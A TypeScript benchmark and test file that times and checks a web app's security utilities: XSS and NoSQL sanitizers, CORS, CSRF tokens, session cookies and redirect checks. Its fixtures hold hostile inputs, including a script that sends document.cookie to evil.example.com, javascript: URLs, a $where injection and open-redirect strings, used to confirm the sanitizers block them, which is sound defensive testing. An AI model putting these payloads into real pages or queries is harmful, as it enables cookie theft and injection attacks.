/**
 * @file tests/benchmarks/security-utils.test.ts
 * @description Micro-benchmark baseline for the pure per-request security utility modules in `src/utils/security/` — the pre-optimization reference for the benchmark-driven optimization loop.
 * @summary Measures hot-path throughput (ops/s, µs/op, batch-sampled p50/p95) of publication policy, safe query, Mongo sanitization, input sanitization, user-attribute policy, permission cache, CORS headers, CSRF tokens, credential hashing, session-cookie resolution, safe redirects, audit flags, and session-duration parsing. Fully self-contained: sync-only paths, no server, no DB, no network.
 * Features:
 * - correctness asserts before every timed loop (unchanged-behavior guard)
 * - ≥1,000 warm-up iterations per case (CI JIT-parity rule)
 * - return-value digest sink + per-iteration input alternation to defeat JIT dead-code elimination / constant folding
 * - sanity asserts only (finite, positive) — no hard absolute time budgets
 * - summary table printed at the end for the optimization agent
 */

import { afterAll, beforeAll, describe, expect, test } from "vitest";
import "../unit/bun-preload.ts";

import {
  applyPublicationToQuery,
  isPublishedStatus,
  publicationCacheSuffix,
  resolvePublicationFilter,
} from "@src/utils/security/publication-policy";
import { assertTenantContext, isMultiTenantMode, safeQuery } from "@src/utils/security/safe-query";
import { sanitizeMongoQuery } from "@src/utils/security/mongo-sanitize";
import {
  containsXssVector,
  sanitizeObject,
  sanitizeString,
} from "@src/utils/security/input-sanitizer";
import { sanitizeClientUserAttributePatch } from "@src/utils/security/user-attribute-policy";
import { permissionCache } from "@src/utils/security/permission-cache";
import { getCorsHeaders } from "@src/utils/security/cors-utils";
import { generateCsrfToken, validateCsrfToken } from "@src/utils/security/csrf-utils";
import { hashCredentialSha256HexSync } from "@src/utils/security/credential-hash";
import {
  readSessionCookie,
  readSessionIdFromCookieHeader,
} from "@src/utils/security/session-cookie";
import { safeRedirect } from "@src/utils/security/safe-redirect";
import { getAuditFlagsSync, isAuditDisabledByEnv } from "@src/utils/security/audit-flags";
import { parseSessionDuration } from "@src/utils/security/auth-utils";
import crypto from "node:crypto";

// ── Fixtures (module scope: stable references keep WeakMap/memoized hot paths honest) ──

const SYSTEM_ACTOR = { system: true as const };
const ADMIN_USER_ACTOR = { user: { _id: "u1", role: "admin", isAdmin: true } };
const VIEWER_ACTOR = { user: { _id: "u2", role: "viewer" } };
const ANON_ACTOR = null;

const PUBLISHED_ROW = { status: "publish" };
const DRAFT_ROW = { status: "draft" };

const CLEAN_TEXT = "This is a plain admin note about the release schedule.";
const CLEAN_TEXT_2 = "Draft guidelines for the autumn content review cycle.";
const XSS_SNIPPET = '<img src="data:text/html,x" onload="x()">';
const XSS_PAYLOAD = `<div class="post"><h2>Hello</h2><p onclick="steal()">Welcome <b>friend</b></p><script>fetch("https://evil.example.com/?c=" + document.cookie)</script><img src="javascript:alert(1)" onerror="alert(2)"><iframe src="data:text/html,<script>alert(3)</script>"></iframe><a href="javascript:void(0)">link</a></div>`;
const XSS_PAYLOAD_2 = `<article><p onmouseover="pwn()">Body <em>text</em></p><object data="https://evil.example.com/x"></object><embed src="javascript:alert(4)"><script src="https://evil.example.com/s.js"></script><form action="javascript:alert(5)"><input onfocus="f()"></form></article>`;

const CLEAN_OBJECT = {
  title: "Release notes",
  body: CLEAN_TEXT,
  tags: ["news", "tech"],
  meta: { author: "editor", pinned: false },
};

const CLEAN_OBJECT_2 = {
  title: "Roadmap",
  body: CLEAN_TEXT_2,
  tags: ["planning"],
  meta: { author: "admin", pinned: true },
};

const DIRTY_OBJECT = {
  title: "Safe title",
  body: "<script>alert(1)</script>",
  tags: ["clean", "<img onerror=alert(1)>"],
  meta: { note: "fine" },
};

const DIRTY_OBJECT_2 = {
  title: "Another",
  body: '<a href="javascript:alert(2)">click</a>',
  tags: ["<iframe src=x></iframe>"],
  meta: { note: "fine" },
};

const MONGO_QUERY_A = {
  $or: [{ status: "publish" }, { "meta.seo.indexed": true }],
  "user.email": { $ne: "" },
  title: { $regex: "^hello", $options: "i" },
  tags: { $in: ["news", "tech"] },
  meta: { views: { $gte: 10 }, nested: { deep: { value: 1 } } },
};

const MONGO_QUERY_B = {
  $and: [{ status: { $in: ["publish", "draft"] } }, { "meta.seo.indexed": false }],
  "user.name": { $regex: "^a", $options: "i" },
  tags: { $nin: ["spam"] },
  meta: { views: { $lt: 100 }, nested: { deep: { value: 2 } } },
};

const PRIVILEGED_PATCH = {
  name: "Jane Doe",
  email: "jane@example.com",
  bio: "Hello world",
  role: "admin",
  isAdmin: true,
  permissions: ["content:write"],
  is2FAEnabled: true,
  totpSecret: "JBSWY3DPEHPK3PXP",
  blocked: false,
  tenantId: "other-tenant",
  _id: "user-123",
  id: "user-123",
  currentPassword: "hunter2",
  confirmPassword: "hunter2",
  password: "",
};

const PRIVILEGED_PATCH_2 = {
  name: "John Smith",
  email: "john@example.com",
  bio: "Hi there",
  role: "super-admin",
  isAdmin: 1,
  permissions: ["*"],
  is2FAEnabled: false,
  totpSecret: "MFRGGZDFMZTWQ2LK",
  blocked: true,
  tenantId: "other-tenant-2",
  _id: "user-456",
  id: "user-456",
  currentPassword: "letmein",
  password: "   ",
};

const CREDENTIAL_INPUT = `sk_svelty_${"a1b2c3d4".repeat(8)}`;
const CREDENTIAL_INPUT_2 = `sk_live_${"9f8e7d6c".repeat(8)}`;
const TOKEN64 = "0123456789abcdef".repeat(4);
const TOKEN64_2 = "fedcba9876543210".repeat(4);
const SESSION_VALUE = "bench-session-token-123";
const COOKIE_HEADER = `theme=dark; my_auth_sessions_extra=zzz; __Host-auth_sessions=${SESSION_VALUE}; csrf_token=abc; auth_sessions=fallback`;
const COOKIE_HEADER_2 = `lang=en; auth_sessions=${SESSION_VALUE}; __Secure-auth_sessions=stale; my_auth_sessions_extra=yyy`;

const sessionReader = {
  get: (name: string) => (name === "auth_sessions" ? SESSION_VALUE : undefined),
};

type CsrfCookieJar = Parameters<typeof generateCsrfToken>[0];
const csrfCookieJar = { get: () => undefined, set: () => {} } as unknown as CsrfCookieJar;
const csrfTokenCookieJar = { get: () => TOKEN64, set: () => {} } as unknown as CsrfCookieJar;

const cacheUser = "bench-user-1";
const cacheUser2 = "bench-user-2";
const cachePermission = "content:read";
const cacheRoles = ["editor", "author"];

const TENANT_OPTS_A = { tenantId: "t-1" };
const TENANT_OPTS_B = { tenantId: "t-2" };
const SAFE_QUERY_A = { path: "/docs/a" };
const SAFE_QUERY_B = { path: "/docs/b" };
const QUERY_MUTATION_TARGET = { path: "/content", page: 1 };

// ── Timing helpers ──

interface Measurement {
  msPerOp: number;
  p50Us: number;
  p95Us: number;
}

/**
 * Module-level sink the timed loops accumulate into. Reading it in afterAll
 * keeps every per-iteration store live, so the JIT cannot dead-store-eliminate
 * the measured call chain.
 */
let benchSink = 0;

/** Consumes a benchmark return value into the sink (cheap, type-agnostic). */
function digestValue(v: unknown): number {
  if (v === null || v === undefined || v === false) return 0;
  if (v === true) return 1;
  if (typeof v === "number") return v;
  if (typeof v === "string") return v.length & 7;
  return 1;
}

/**
 * Sync timing with ≥1,000 warm-up calls (CI JIT-parity rule). The timed loop is
 * split into 20 batches; per-batch µs/op samples feed p50/p95, and the mean of
 * the batches is the reported per-op cost. Each call's return value feeds the
 * digest sink and `i` is passed to the closure so cases can alternate inputs,
 * defeating dead-code elimination / constant folding.
 */
function measureSync(fn: (i: number) => unknown, iterations: number, warmup = 1000): Measurement {
  for (let w = 0; w < warmup; w++) fn(w);

  const batches = 20;
  const perBatch = Math.max(1, Math.floor(iterations / batches));
  const samples: number[] = [];
  for (let b = 0; b < batches; b++) {
    const start = performance.now();
    for (let i = 0; i < perBatch; i++) {
      benchSink += digestValue(fn(i));
    }
    samples.push(((performance.now() - start) / perBatch) * 1000);
  }

  samples.sort((a, b) => a - b);
  const meanUs = samples.reduce((sum, v) => sum + v, 0) / samples.length;
  return {
    msPerOp: meanUs / 1000,
    p50Us: samples[Math.floor(samples.length * 0.5)]!,
    p95Us: samples[Math.min(samples.length - 1, Math.floor(samples.length * 0.95))]!,
  };
}

interface BenchRow {
  op: string;
  opsPerSec: number;
  usPerOp: number;
  p50Us: number;
  p95Us: number;
}

const results: BenchRow[] = [];

/** Benchmark one case: sanity asserts + result row (correctness asserts live in the tests). */
function recordBenchmark(op: string, fn: (i: number) => unknown, iterations: number): void {
  const { msPerOp, p50Us, p95Us } = measureSync(fn, iterations);
  expect(Number.isFinite(msPerOp)).toBe(true);
  expect(msPerOp).toBeGreaterThan(0);
  const opsPerSec = 1000 / msPerOp;
  results.push({ op, opsPerSec, usPerOp: msPerOp * 1000, p50Us, p95Us });
  console.log(
    `  ${op.padEnd(60)} ${Math.round(opsPerSec).toLocaleString("en-US").padStart(12)} ops/s   ${(msPerOp * 1000).toFixed(2).padStart(8)} µs/op`,
  );
}

describe("Security Utils Baseline — pure per-request modules", () => {
  beforeAll(() => {
    // Prime lazy/memoized state so no first-call cost (or first-call logger
    // noise) leaks into any timed loop: MULTI_TENANT flag cache, session-cookie
    // WeakMap (both mode keys), permission-cache hot entries, and the
    // deterministic audit-flags env fast path (the async DB loader is out of
    // scope for this baseline).
    isMultiTenantMode();
    readSessionCookie(sessionReader, false);
    readSessionCookie(sessionReader, true);
    permissionCache.set(cacheUser, cachePermission, cacheRoles, true);
    permissionCache.set(cacheUser2, cachePermission, cacheRoles, true);
    process.env.DISABLE_AUDIT_LOGS = "true";
  });

  test("publication-policy — status checks, filter resolution, query clamp, cache suffix", async () => {
    expect(isPublishedStatus({ status: "publish" })).toBe(true);
    expect(isPublishedStatus({ status: "published" })).toBe(true);
    expect(isPublishedStatus({ status: "draft" })).toBe(false);
    expect(isPublishedStatus(null)).toBe(false);

    expect(resolvePublicationFilter(SYSTEM_ACTOR, "draft")).toBe("draft");
    expect(resolvePublicationFilter(SYSTEM_ACTOR, undefined)).toBe("all");
    expect(resolvePublicationFilter(ANON_ACTOR, "all")).toBe("published");
    expect(resolvePublicationFilter(ANON_ACTOR, "draft")).toBe("published");
    expect(resolvePublicationFilter(VIEWER_ACTOR, "bogus")).toBe("published");

    expect(applyPublicationToQuery({ path: "/a" }, "published")).toEqual({
      path: "/a",
      status: "publish",
    });
    expect(applyPublicationToQuery({ path: "/a" }, "draft")).toEqual({
      path: "/a",
      status: { $in: ["draft", "unpublish"] },
    });
    expect(applyPublicationToQuery({ path: "/a" }, "all")).toEqual({ path: "/a" });

    expect(publicationCacheSuffix("all")).toBe("");
    expect(publicationCacheSuffix("published")).toBe(":published");

    recordBenchmark(
      "publication-policy.isPublishedStatus",
      (i) => isPublishedStatus(i & 1 ? PUBLISHED_ROW : DRAFT_ROW),
      1_000_000,
    );
    recordBenchmark(
      "publication-policy.resolvePublicationFilter (privileged)",
      (i) => resolvePublicationFilter(ADMIN_USER_ACTOR, i & 1 ? "draft" : "all"),
      500_000,
    );
    recordBenchmark(
      "publication-policy.resolvePublicationFilter (clamped)",
      (i) => resolvePublicationFilter(i & 1 ? VIEWER_ACTOR : ANON_ACTOR, i & 1 ? "all" : "draft"),
      500_000,
    );
    recordBenchmark(
      "publication-policy.applyPublicationToQuery (published/draft)",
      (i) => applyPublicationToQuery(QUERY_MUTATION_TARGET, i & 1 ? "published" : "draft"),
      300_000,
    );
    recordBenchmark(
      "publication-policy.publicationCacheSuffix",
      (i) => publicationCacheSuffix(i & 1 ? "published" : "draft"),
      1_000_000,
    );

    expect(isPublishedStatus({ status: "publish" })).toBe(true);
  }, 300_000);

  test("safe-query — cached tenant mode, tenant context gate, soft-delete boundary", async () => {
    expect(typeof isMultiTenantMode()).toBe("boolean");
    expect(isMultiTenantMode()).toBe(isMultiTenantMode()); // 5s memoization stable

    expect(() => assertTenantContext({ tenantId: "t-1" }, "read")).not.toThrow();

    const scopedQuery: Record<string, unknown> = { path: "/docs/a" };
    const scoped = safeQuery(scopedQuery, "t-1", {});
    expect(scoped.tenantId).toBe("t-1");
    expect(scoped.isDeleted).toEqual({ $ne: true });
    expect(scoped.path).toBe("/docs/a");

    expect(safeQuery({ path: "/docs/b" }, undefined, { bypassSafeQuery: true })).toEqual({
      path: "/docs/b",
    });

    recordBenchmark("safe-query.isMultiTenantMode (cached)", () => isMultiTenantMode(), 1_000_000);
    recordBenchmark(
      "safe-query.assertTenantContext (scoped)",
      (i) => assertTenantContext(i & 1 ? TENANT_OPTS_A : TENANT_OPTS_B, "read"),
      1_000_000,
    );
    recordBenchmark(
      "safe-query.safeQuery (soft-delete boundary)",
      (i) => safeQuery(i & 1 ? SAFE_QUERY_A : SAFE_QUERY_B, i & 1 ? "t-1" : "t-2", {}),
      200_000,
    );
  }, 300_000);

  test("mongo-sanitize — nested sanitization (blocked operators throw, correctness-only)", async () => {
    const clean = JSON.parse(JSON.stringify(MONGO_QUERY_A));
    sanitizeMongoQuery(clean);
    expect(clean).toEqual(MONGO_QUERY_A);

    let blocked: unknown = null;
    try {
      sanitizeMongoQuery({ $where: "this.secret === true" });
    } catch (err) {
      blocked = err;
    }
    expect(blocked).toBeInstanceOf(Error);
    expect((blocked as { status?: number }).status).toBe(400);
    expect((blocked as { code?: string }).code).toBe("NOSQL_INJECTION_BLOCKED");

    let longRegex: unknown = null;
    try {
      sanitizeMongoQuery({ title: { $regex: "a".repeat(501) } });
    } catch (err) {
      longRegex = err;
    }
    expect((longRegex as { code?: string }).code).toBe("REGEX_TOO_LONG");

    // Blocked-operator and over-long-regex paths throw (logger.error + AppError)
    // and are attack traffic, not per-request cost — only the clean nested
    // recursion is timed.
    recordBenchmark(
      "mongo-sanitize.sanitizeMongoQuery (nested, 3 levels)",
      (i) => sanitizeMongoQuery(i & 1 ? MONGO_QUERY_A : MONGO_QUERY_B),
      30_000,
    );
  }, 300_000);

  test("input-sanitizer — XSS pre-check, string sanitize, object sanitize", async () => {
    expect(containsXssVector(CLEAN_TEXT)).toBe(false);
    expect(containsXssVector("<script>alert(1)</script>")).toBe(true);
    expect(containsXssVector('href="javascript:alert(1)"')).toBe(true);
    expect(containsXssVector('<img src="data:text/html,x">')).toBe(true);

    const cleaned = sanitizeString(XSS_PAYLOAD);
    expect(cleaned).not.toContain("<script");
    expect(cleaned).not.toContain("onclick");
    expect(cleaned).not.toContain("javascript:");
    expect(cleaned).toContain("<b>friend</b>");
    expect(cleaned).toContain("<h2>Hello</h2>");
    expect(sanitizeString(CLEAN_TEXT)).toBe(CLEAN_TEXT);

    expect(sanitizeObject(CLEAN_OBJECT)).toBe(CLEAN_OBJECT); // zero-copy fast path
    const dirty = sanitizeObject(DIRTY_OBJECT);
    expect(dirty).not.toBe(DIRTY_OBJECT);
    expect(dirty.body).not.toContain("<script");
    expect(dirty.tags[1]).not.toContain("onerror");
    expect(dirty.title).toBe("Safe title");

    recordBenchmark(
      "input-sanitizer.containsXssVector (clean)",
      (i) => containsXssVector(i & 1 ? CLEAN_TEXT : CLEAN_TEXT_2),
      500_000,
    );
    recordBenchmark(
      "input-sanitizer.containsXssVector (xss)",
      (i) => containsXssVector(i & 1 ? XSS_PAYLOAD : XSS_SNIPPET),
      500_000,
    );
    recordBenchmark(
      "input-sanitizer.sanitizeString (clean short)",
      (i) => sanitizeString(i & 1 ? CLEAN_TEXT : CLEAN_TEXT_2),
      100_000,
    );
    recordBenchmark(
      "input-sanitizer.sanitizeString (xss long)",
      (i) => sanitizeString(i & 1 ? XSS_PAYLOAD : XSS_PAYLOAD_2),
      20_000,
    );
    recordBenchmark(
      "input-sanitizer.sanitizeObject (clean fast path)",
      (i) => sanitizeObject(i & 1 ? CLEAN_OBJECT : CLEAN_OBJECT_2),
      100_000,
    );
    recordBenchmark(
      "input-sanitizer.sanitizeObject (dirty)",
      (i) => sanitizeObject(i & 1 ? DIRTY_OBJECT : DIRTY_OBJECT_2),
      50_000,
    );
  }, 300_000);

  test("user-attribute-policy — client attribute patch sanitization", async () => {
    const nonAdmin = sanitizeClientUserAttributePatch(PRIVILEGED_PATCH, { isAdmin: false });
    expect(nonAdmin.name).toBe("Jane Doe");
    expect(nonAdmin.email).toBe("jane@example.com");
    expect(nonAdmin.role).toBeUndefined();
    expect(nonAdmin.isAdmin).toBeUndefined();
    expect(nonAdmin.permissions).toBeUndefined();
    expect(nonAdmin.is2FAEnabled).toBeUndefined();
    expect(nonAdmin.totpSecret).toBeUndefined();
    expect(nonAdmin.blocked).toBeUndefined();
    expect(nonAdmin.tenantId).toBeUndefined();
    expect(nonAdmin._id).toBeUndefined();
    expect(nonAdmin.id).toBeUndefined();
    expect(nonAdmin.currentPassword).toBeUndefined();
    expect(nonAdmin.confirmPassword).toBeUndefined();
    expect(nonAdmin.password).toBeUndefined(); // empty password dropped

    const admin = sanitizeClientUserAttributePatch(PRIVILEGED_PATCH, { isAdmin: true });
    expect(admin.role).toBe("admin");
    expect(admin.isAdmin).toBe(true);
    expect(admin._id).toBeUndefined(); // identity rewrite keys always dropped
    expect(admin.currentPassword).toBeUndefined();

    recordBenchmark(
      "user-attribute-policy.sanitizeClientUserAttributePatch (non-admin)",
      (i) =>
        sanitizeClientUserAttributePatch(i & 1 ? PRIVILEGED_PATCH : PRIVILEGED_PATCH_2, {
          isAdmin: false,
        }),
      100_000,
    );
    recordBenchmark(
      "user-attribute-policy.sanitizeClientUserAttributePatch (admin)",
      (i) =>
        sanitizeClientUserAttributePatch(i & 1 ? PRIVILEGED_PATCH : PRIVILEGED_PATCH_2, {
          isAdmin: true,
        }),
      200_000,
    );
  }, 300_000);

  test("permission-cache — get hit / miss / set", async () => {
    expect(permissionCache.get(cacheUser, cachePermission, cacheRoles)).toBe(true);
    expect(permissionCache.get(cacheUser2, cachePermission, cacheRoles)).toBe(true);
    expect(permissionCache.get("ghost-user", cachePermission, cacheRoles)).toBeNull();
    permissionCache.set(cacheUser, "other:permission", cacheRoles, false);
    expect(permissionCache.get(cacheUser, "other:permission", cacheRoles)).toBe(false);

    // TTL-expiry path (Date.now() + Map.delete) is unreachable via the public
    // API without waiting 5 minutes; its cost ≈ hit path + one Map.delete.
    // LRU eviction in set() only engages at ≥1,000 entries.
    recordBenchmark(
      "permission-cache.get (hit)",
      (i) => permissionCache.get(i & 1 ? cacheUser : cacheUser2, cachePermission, cacheRoles),
      500_000,
    );
    recordBenchmark(
      "permission-cache.get (miss)",
      (i) =>
        permissionCache.get(i & 1 ? "ghost-user" : "ghost-user-2", cachePermission, cacheRoles),
      500_000,
    );
    recordBenchmark(
      "permission-cache.set",
      (i) => permissionCache.set(i & 1 ? cacheUser : cacheUser2, cachePermission, cacheRoles, true),
      300_000,
    );
  }, 300_000);

  test("cors-utils — getCorsHeaders for allowed and disallowed origins", async () => {
    // `isAllowedOrigin` is module-private — exercised via getCorsHeaders. The
    // $app/env unit mock reports dev=true, so the dev branch (URL parse +
    // localhost allowlist) is timed; the production branch is a plain array includes.
    const allowed = getCorsHeaders("http://localhost:5173", true);
    expect(allowed?.["Access-Control-Allow-Origin"]).toBe("http://localhost:5173");
    expect(allowed?.["Access-Control-Allow-Credentials"]).toBe("true");

    const disallowed = getCorsHeaders("https://evil.example.com", true);
    expect(disallowed?.["Access-Control-Allow-Origin"]).toBe("null");
    expect(disallowed?.["Access-Control-Allow-Methods"]).toBe("");

    expect(getCorsHeaders(null, true)).toBeNull();

    recordBenchmark(
      "cors-utils.getCorsHeaders (allowed)",
      (i) => getCorsHeaders(i & 1 ? "http://localhost:5173" : "http://localhost:3000", true),
      100_000,
    );
    recordBenchmark(
      "cors-utils.getCorsHeaders (disallowed)",
      (i) => getCorsHeaders(i & 1 ? "https://evil.example.com" : "https://phish.example.net", true),
      100_000,
    );
    // Repeated-origin case: the dominant real-world shape (a browser session
    // issues many requests from one origin). Exercises the single-slot memo
    // (URL parse + header-object allocation skipped after the first call).
    recordBenchmark(
      "cors-utils.getCorsHeaders (same origin repeated)",
      () => getCorsHeaders("http://localhost:5173", true),
      200_000,
    );
  }, 300_000);

  test("csrf-utils — token generation and constant-time validation", async () => {
    const token = generateCsrfToken(csrfCookieJar, false);
    expect(token).toMatch(/^[0-9a-f]{64}$/);

    expect(validateCsrfToken(csrfTokenCookieJar, TOKEN64, false)).toBe(true);
    expect(validateCsrfToken(csrfTokenCookieJar, `b${TOKEN64.slice(1)}`, false)).toBe(false);
    expect(validateCsrfToken(csrfTokenCookieJar, "short", false)).toBe(false);
    expect(validateCsrfToken(csrfTokenCookieJar, undefined, false)).toBe(false);

    // Valid path rotates the token (regenerates via CSPRNG) on every success.
    recordBenchmark(
      "csrf-utils.generateCsrfToken (CSPRNG 32B)",
      () => generateCsrfToken(csrfCookieJar, false),
      50_000,
    );
    recordBenchmark(
      "csrf-utils.validateCsrfToken (valid + rotation)",
      (i) => validateCsrfToken(csrfTokenCookieJar, TOKEN64, i % 2 === 0),
      50_000,
    );
    recordBenchmark(
      "csrf-utils.validateCsrfToken (invalid)",
      (i) =>
        validateCsrfToken(
          csrfTokenCookieJar,
          i & 1 ? `b${TOKEN64.slice(1)}` : `b${TOKEN64_2.slice(1)}`,
          false,
        ),
      100_000,
    );
  }, 300_000);

  test("credential-hash — sync SHA-256 hex (ring-buffer pool)", async () => {
    const expected = crypto.createHash("sha256").update(CREDENTIAL_INPUT).digest("hex");
    const actual = hashCredentialSha256HexSync(CREDENTIAL_INPUT);
    expect(actual).toBe(expected);
    expect(actual).toMatch(/^[0-9a-f]{64}$/);

    recordBenchmark(
      "credential-hash.hashCredentialSha256HexSync",
      (i) => hashCredentialSha256HexSync(i & 1 ? CREDENTIAL_INPUT : CREDENTIAL_INPUT_2),
      30_000,
    );
  }, 300_000);

  test("session-cookie — reader (WeakMap hit) and raw header parse", async () => {
    expect(readSessionCookie(sessionReader, false)).toBe(SESSION_VALUE);
    expect(readSessionCookie({ get: () => undefined }, true)).toBeUndefined();
    expect(readSessionCookie(null, false)).toBeUndefined();

    // Boundary: `my_auth_sessions_extra` must not match `auth_sessions`.
    expect(readSessionIdFromCookieHeader(COOKIE_HEADER, true)).toBe(SESSION_VALUE);
    expect(readSessionIdFromCookieHeader("auth_sessions=plain; theme=dark", true)).toBe("plain");
    expect(readSessionIdFromCookieHeader("", true)).toBeUndefined();

    recordBenchmark(
      "session-cookie.readSessionCookie (WeakMap hit)",
      (i) => readSessionCookie(sessionReader, i % 2 === 0),
      500_000,
    );
    recordBenchmark(
      "session-cookie.readSessionIdFromCookieHeader",
      (i) => readSessionIdFromCookieHeader(i & 1 ? COOKIE_HEADER : COOKIE_HEADER_2, true),
      200_000,
    );
  }, 300_000);

  test("safe-redirect — internal paths pass, traversal/protocol payloads fall back", async () => {
    expect(safeRedirect("/dashboard", "/")).toBe("/dashboard");
    expect(safeRedirect("/admin/settings?tab=general", "/")).toBe("/admin/settings?tab=general");

    expect(safeRedirect("//evil.example.com", "/")).toBe("/");
    expect(safeRedirect("https://evil.example.com", "/")).toBe("/");
    expect(safeRedirect("javascript:alert(1)", "/")).toBe("/");
    expect(safeRedirect("/\\evil.example.com", "/")).toBe("/");
    expect(safeRedirect("evil.example.com", "/")).toBe("/");
    expect(safeRedirect("", "/")).toBe("/");
    expect(safeRedirect(null, "/")).toBe("/");

    // Only the safe path is timed: the blocked path adds a logger.warn
    // (timestamp formatting + console write) on top — attack-traffic cost,
    // not per-request cost. Noted for the optimization agent.
    recordBenchmark(
      "safe-redirect.safeRedirect (safe internal)",
      (i) => safeRedirect(i & 1 ? "/dashboard/settings" : "/admin/users?tab=roles", "/"),
      500_000,
    );
  }, 300_000);

  test("audit-flags — env fast path (DB loader excluded by design)", async () => {
    // DISABLE_AUDIT_LOGS=true (set in beforeAll) makes envFlags() short-circuit
    // before the memoized cache / background DB refresh — pure sync, no async.
    expect(isAuditDisabledByEnv()).toBe(true);
    expect(getAuditFlagsSync()).toEqual({ disabled: true, chainSync: false });

    recordBenchmark("audit-flags.isAuditDisabledByEnv", () => isAuditDisabledByEnv(), 1_000_000);
    recordBenchmark(
      "audit-flags.getAuditFlagsSync (env fast path)",
      () => getAuditFlagsSync(),
      1_000_000,
    );
  }, 300_000);

  test("auth-utils — session duration parsing (valid + invalid)", async () => {
    expect(parseSessionDuration("1h")).toBe(3_600_000);
    expect(parseSessionDuration("7d")).toBe(604_800_000);
    expect(parseSessionDuration("30m")).toBe(1_800_000);
    expect(parseSessionDuration("2w")).toBe(1_209_600_000);
    expect(parseSessionDuration("90ms")).toBe(90);
    expect(parseSessionDuration("")).toBe(86_400_000);
    expect(parseSessionDuration("not-a-duration")).toBe(86_400_000);
    expect(parseSessionDuration("12x")).toBe(86_400_000);

    recordBenchmark(
      "auth-utils.parseSessionDuration (valid)",
      (i) => parseSessionDuration(i & 1 ? "2h" : "30m"),
      500_000,
    );
    recordBenchmark(
      "auth-utils.parseSessionDuration (invalid)",
      (i) => parseSessionDuration(i & 1 ? "not-a-duration" : "12x"),
      500_000,
    );
  }, 300_000);

  afterAll(() => {
    console.log("\n──────────────────────────────────────────────────────────────────────────────");
    console.log(" SECURITY UTILS BASELINE — op | ops/s | µs/op | p50 µs | p95 µs");
    console.log("──────────────────────────────────────────────────────────────────────────────");
    for (const r of results) {
      console.log(
        ` ${r.op.padEnd(54)} ${String(Math.round(r.opsPerSec).toLocaleString("en-US")).padStart(11)} ${r.usPerOp.toFixed(2).padStart(8)} ${r.p50Us.toFixed(2).padStart(7)} ${r.p95Us.toFixed(2).padStart(7)}`,
      );
    }
    console.log("──────────────────────────────────────────────────────────────────────────────");
    console.log(` digest sink (liveness guard): ${benchSink}`);
  });
});
